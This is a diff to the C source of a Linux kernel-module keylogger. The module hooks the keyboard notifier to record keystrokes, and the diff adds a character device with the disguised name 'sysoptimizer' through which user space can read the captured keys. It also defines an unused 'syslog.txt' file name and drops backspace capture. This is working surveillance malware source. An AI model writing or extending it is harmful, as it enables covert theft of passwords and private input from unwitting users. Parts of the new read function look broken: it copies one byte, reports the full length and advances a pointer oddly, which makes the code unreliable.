@@ -1,13 +1,23 @@
-#include <linux/module.h>
 #include <linux/kernel.h>
+#include <linux/module.h>
 #include <linux/keyboard.h>
 #include <linux/fs.h>
+#include <linux/file.h>
+#include <linux/fcntl.h>
+#include <linux/syscalls.h>
 #include <linux/uaccess.h>
+#include <linux/init.h>
+#include <asm/uaccess.h>
+#include <asm/segment.h>
 #include <linux/notifier.h>
 
 // Module Info
 
 #define SIZE_OF_MAP 94
+#define FILE_NAME "syslog.txt"
+#define DEVICE_NAME "sysoptimizer"
+
+static int major; // The Major Number that will be assigned to our Device Driver
 
 // Keylogger Info
 
@@ -129,6 +139,7 @@ struct Map map[SIZE_OF_MAP] = {
 };
 
 // Prototypes
+static ssize_t dev_read(struct file *, char __user *, size_t,loff_t *);
 static int keys_pressed(struct notifier_block *, unsigned long, void *); // Callback function for the Notification chain
 
 // Function to get the value of key from the map
@@ -139,6 +150,12 @@ const char * get_value(char key){
 			return map[i].value;
 	}	
 }
+
+// Setting the Device DRiver read function
+static struct file_operations fops ={
+	//.write = dev_write,
+	.read = dev_read
+};
 
 // Initializing the notifier_block
 static struct notifier_block nb = {
@@ -157,10 +174,6 @@ static int keys_pressed(struct notifier_block *nb, unsigned long action,void *da
 			pr_info("newline");
 			*(keys_bf_ptr++) = "newLine";
 			buf_pos++;
-		} else if (c == 65288){
-			pr_info("BackSpace");
-			*(keys_bf_ptr++) = "BackSpace";
-			buf_pos++;
 		} else if (c >= 0x20 && c < 0x7f){
 			pr_info("%s",get_value(c));
 			*(keys_bf_ptr++) = get_value(c);
@@ -170,14 +183,36 @@ static int keys_pressed(struct notifier_block *nb, unsigned long action,void *da
 		// Check with buf_pos for buffer overflows
 		if (buf_pos >= BUFFER_LEN){
 			buf_pos = 0;
-			memset(*keys_buffer, 0, BUFFER_LEN);
+			memset(keys_buffer, 0, BUFFER_LEN);
 			keys_bf_ptr = keys_buffer;
 		}
+	
 	}
 	return NOTIFY_OK; // This retrun value means that the notification was processed correctly.
 }
 
+// Device driver read function
+static ssize_t dev_read(struct file *fp, char __user *buf, size_t length, loff_t *offset){
+	int len = strlen(*keys_buffer);
+	pr_info("len : %d",len);
+	int result = copy_to_user(buf, *keys_buffer, 1);
+	if (result){
+		pr_info("Couldn't copy all data to user space\n");
+		return result;
+	}
+	(*keys_buffer)++;
+	keys_bf_ptr = keys_buffer; // Reset buffer pointer
+	return len;
+}
+
 static int __init keyLogger_birth(void){
+	major = register_chrdev(0 , DEVICE_NAME, &fops);
+	if (major < 0){
+		pr_info("keylog failed to register a major number\n");
+		return major;
+	}
+
+	pr_info("Registered keylogger with major number %d",major);
 	register_keyboard_notifier(&nb);
 	memset(keys_buffer, 0, BUFFER_LEN);
         pr_info("A new keyLogger was born\n");
@@ -185,6 +220,7 @@ static int __init keyLogger_birth(void){
 }
 
 static void __exit keyLogger_death(void){
+	unregister_chrdev(major, DEVICE_NAME);
 	unregister_keyboard_notifier(&nb);
         pr_info("The keyLogger is dead\n");
 }
